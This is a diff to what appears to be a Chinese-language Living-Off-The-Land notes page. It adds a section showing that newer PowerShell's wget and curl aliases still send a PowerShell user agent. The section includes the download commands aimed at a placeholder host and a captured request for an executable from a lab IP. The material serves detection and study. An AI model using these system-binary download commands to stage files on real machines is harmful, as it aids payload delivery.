@@ -266,6 +266,24 @@ User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
 Host: 192.168.220.125
 ```
 
+### 12. Powershell-wget/curl
+
+较新版本powershell中, 添加了 curl/wget 的实现, 但是两者所用ua仍为 powershell
+
+```powershell
+powershell /c wget http://xxxxxx.xxxx.xx
+powershell /c curl http://xxxxxx.xxxx.xx
+```
+
+[***pcap***]({{site.url}}/assets/Living_Off_The_Land/pcap/powershell_wget.pcap)
+
+```http
+GET /white_process/call_calc.exe HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; zh-CN) WindowsPowerShell/5.1.17763.316
+Host: 192.168.220.125
+Connection: Keep-Alive
+```
+
 ## Reference
 
 - [lolbas/#download](https://lolbas-project.github.io/#/download)
